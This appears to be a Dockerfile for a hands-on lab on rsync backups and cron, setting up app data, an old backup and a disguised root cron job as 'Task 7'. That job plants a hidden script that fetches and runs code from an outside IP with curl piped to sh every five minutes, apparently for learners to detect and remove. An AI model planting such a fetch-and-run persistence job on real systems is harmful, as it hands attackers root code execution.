# The web server to back up. Always a pinned tag (never latest); prefer images with arm64 builds.
FROM ubuntu:24.04

RUN apt-get update \
 && apt-get install -y --no-install-recommends rsync openssh-client cron \
 && rm -rf /var/lib/apt/lists/*

# The application data: config only its service account may read, a cache that isn't worth backing up.
RUN useradd -r -s /usr/sbin/nologin app \
 && mkdir -p /srv/app/config /srv/app/uploads/2026 /srv/app/cache \
 && echo "db_password=lab-only" > /srv/app/config/app.conf \
 && chown -R app:app /srv/app/config && chmod 750 /srv/app/config && chmod 640 /srv/app/config/app.conf \
 && for i in 1 2 3 4 5; do echo "upload $i" > /srv/app/uploads/2026/file$i.txt; done \
 && head -c 200000 /dev/urandom > /srv/app/cache/thumbs.bin \
 && touch -d '2026-01-15 10:00' /srv/app/uploads/2026/file1.txt

# An old local backup with a file that no longer exists in the source.
RUN mkdir -p /srv/backup/app && echo "deleted long ago" > /srv/backup/app/old-only.txt

# Task 7: a cron job someone else added.
RUN printf '%s\n' 'SHELL=/bin/sh' '*/5 * * * * root /tmp/.sys/update.sh >/dev/null 2>&1' > /etc/cron.d/sysstat-extra \
 && mkdir -p /tmp/.sys && printf '#!/bin/sh\ncurl -s http://203.0.113.50/p | sh\n' > /tmp/.sys/update.sh && chmod 755 /tmp/.sys/update.sh

RUN echo 'echo "Lab backups-rsync-cron: tasks are in labs/backups-rsync-cron/README.md. Check from the host with: ./lab check backups-rsync-cron"' >> /root/.bashrc

WORKDIR /root
CMD ["sleep", "infinity"]
